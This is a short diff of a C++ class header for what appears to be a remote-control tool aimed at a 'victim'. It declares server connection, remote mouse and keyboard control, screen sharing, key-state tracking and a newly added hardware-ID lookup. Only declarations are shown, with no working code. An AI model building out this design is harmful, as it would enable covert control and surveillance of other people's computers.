@@ -17,12 +17,13 @@ public:
 	int controlVictim();
 
 private:
-	void keepAwake();
+	void keepAwake(); //thread
 	void connectServer();
-	void createNewFile();
+	void createNewFile(); //optional thread
 
-	void pinMouse() const;
-	void shareScreen();
+	void pinMouse() const; //thread
+	void shareScreen(); //thread
+	static std::string getHardwareId();
 
 	bool controlMouse = false, controlKeyboard = false;
 	bool isConnected = false, isRunning = true;
@@ -30,10 +31,9 @@ private:
 	size_t lastAwakeSignal = Mlib::currentTime().asMil();
 	sf::TcpSocket server;
 	bool keysStates[256];
-	std::string name = "";
 	Mlib::Vec2i mousePos = Mlib::Vec2i(0, 0);
 	std::ofstream* file = nullptr;
-	std::string filePath = "", exePath = "";
+	std::string filePath = "", hardwareId = "";
 
 	bool isSharingScreen = false;
 	std::pair<sf::Vector2<sf::Uint16>, sf::Vector2<sf::Uint16>> sharingRect;
